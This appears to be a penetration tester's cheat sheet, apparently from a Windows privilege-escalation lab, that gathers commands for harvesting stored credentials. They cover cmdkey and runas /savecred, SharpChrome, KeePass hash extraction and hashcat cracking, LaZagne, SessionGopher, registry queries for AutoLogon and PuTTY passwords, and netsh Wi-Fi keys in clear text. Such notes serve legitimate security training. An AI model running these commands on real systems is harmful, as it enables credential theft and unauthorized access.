## Cmdkey Saved Credentials

**Listing Saved Credentials
```
cmdkey /list
```
- RDP to computer SQL01 as inlanefreight\bob is stored

**Run Commands as Another User
```
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```


## Browser Credentials

SharpChrome: https://github.com/GhostPack/SharpDPAPI

**Retreiving Saved Credentials from Chrome
```
.\SharpChrome.exe logins /unprotect
```
Blue team detection: Event ID 4688, 16385, 4662, 4663


## Password Managers

- .kdbx = KeePass
keepass2john: https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py
- Run Hashcat or John the Ripper

**Extracting KeePass Hash
```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

**Cracking Hash Offline
```
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

**Email
https://github.com/dafthack/MailSniper


## More Fun with Credentials

**LaZagne
https://github.com/AlessandroZ/LaZagne

```ps
.\lazagne.exe -h
.\lazagne.exe all
```


## Even More Fun with Credentials

**SessionGopher
https://github.com/Arvanaghi/SessionGopher

**Running SessionGopher as Current User
```ps
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```


## Clear-Text Password Storage in the Registry

**Windows AutoLogon
Stores passwords in clear-text in registry

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

- AdminAutoLogon, 1 = enabled
- DefaultUserName
- DefaultPassword

**Enumerating Autologon with reg.exe
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Putty
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

**Enumerating Sessions and Finding Credentials
```ps
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```


## Wifi Passwords

**Viewing Saved Wireless Networks
```
netsh wlan show profile
```

**Retrieving Saved Wireless Passwords
```
netsh wlan show profile ilfreight_corp key=clear
```
